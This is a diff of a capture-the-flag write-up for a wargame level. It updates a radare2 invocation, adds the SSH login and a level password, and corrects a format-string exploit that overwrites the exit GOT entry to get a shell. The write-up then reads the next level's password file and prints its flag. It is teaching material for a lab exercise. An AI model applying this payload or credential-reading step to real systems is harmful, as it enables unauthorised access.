@@ -12,14 +12,14 @@ scp -r -P 4243 level5@localhost:/home/user/level5/level5 .
 
 I am running `r2` inside docker.
 ```bash
-docker run -it -v "$bin_file_path":/mnt/binary radare/radare2 bash -c "r2 /mnt/binary"
+docker run -it -v "$bin_file_path":/mnt/binary radare/radare2 bash -c "sudo /snap/radare2/current/bin/r2 /mnt/binary"
 ```
 
 ## Binary Analysis
 
 On the `r2` prompt we need to run a couple of commands to analyze the `main` function.
 ```bash
-[0x08048de8]> aaa # Automatically analyze the binary
+[0x08048de8]> aaa # Analyze the binary
 ...
 [0x08048ec0]> v # Enter visual mode
 ```
@@ -190,7 +190,7 @@ We want to change the `exit` address (not `_exit`) on the *GOT* table to the `o(
 
 To find the *exit* address on the *GOT* table we have to open radare2 and execute the following commands:
 ```bash
-[0x080484ff]> aaa # Automatically analyze the binary
+[0x080484ff]> aaa # Analyze the binary
 ...
 [0x080484ff]> s 0x080484ff # Seek exit function
 [0x080484ff]> pdf # Printf disassembly of the current function
@@ -224,9 +224,12 @@ We need the address `c` to be equal to *134513828* to get access to the shell wi
 
 ### Solution
 
+Connect with `ssh -p 4243 level5@localhost`
+Enter the password `0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a`
+
 We can execute the `printf` buffer to store the number *134513828* on the address `0x08049838` where the `exit` *GOT*'s address is with this line. Of course, because we are running a shell through a pipe, we can keep the `stdin` open like the same trick from the last level:
 ```bash
-$(printf '\x38\x98\x04\x08' && echo '%134513824c%4$n' ; cat ) | ./level5
+(printf '\x38\x98\x04\x08' && echo '%134513824c%4$n' ; cat ) | ./level5
 
 cat /home/user/level6/.pass
 d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
